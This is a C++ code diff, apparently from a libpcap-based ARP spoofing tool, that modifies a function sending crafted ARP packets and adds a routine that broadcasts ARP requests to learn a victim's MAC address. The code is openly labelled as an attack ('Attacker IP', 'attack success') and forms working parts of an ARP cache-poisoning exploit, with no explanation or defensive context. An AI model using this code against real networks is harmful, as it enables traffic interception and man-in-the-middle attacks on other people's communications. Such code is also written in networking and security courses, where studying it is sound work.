@@ -19,7 +19,7 @@ void get_attacker_ip(char* dev, Ip* my_ip) {
 	printf("Attacker IP: %s\n", std::string(*my_ip).c_str());
 }
 
-void send_arp(pcap_t* handle, Mac destination_mac, Mac source_mac, uint16_t op, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip) {
+void send_arp(pcap_t* handle, Mac destination_mac, Mac source_mac, uint16_t op, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip, bool is_attack) {
 	EthArpPacket packet;
 	packet.eth_.dmac_ = destination_mac;
 	packet.eth_.smac_ = source_mac;
@@ -39,6 +39,38 @@ void send_arp(pcap_t* handle, Mac destination_mac, Mac source_mac, uint16_t op, 
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
 	else {
-		printf("Attack success\n");
+        is_attack ? printf("attack success\n") : printf("send packet success\n");
 	}
+}
+
+Mac get_sender_mac(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, Ip sender_ip, int message) {
+    Mac sender_mac;
+    
+    send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), attacker_mac, ArpHdr::Request , attacker_mac, attacker_ip, Mac("00:00:00:00:00:00"), sender_ip, false);
+
+    while(true) {
+        struct pcap_pkthdr* header;
+        const u_char* send_packet;
+        int res = pcap_next_ex(handle, &header, &send_packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
+
+        EthArpPacket* original_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(send_packet));
+
+        if(original_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
+        if(original_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
+        if(original_packet->arp_.sip_!= htonl(sender_ip)) continue;
+
+
+        sender_mac = original_packet->arp_.smac_;
+		if(message == 0) printf("%s: %s\n", "Sender Mac", std::string(sender_mac).c_str());
+		else printf("%s: %s\n", "Target Mac", std::string(sender_mac).c_str());
+
+        break;
+    }
+
+    return sender_mac;
 }
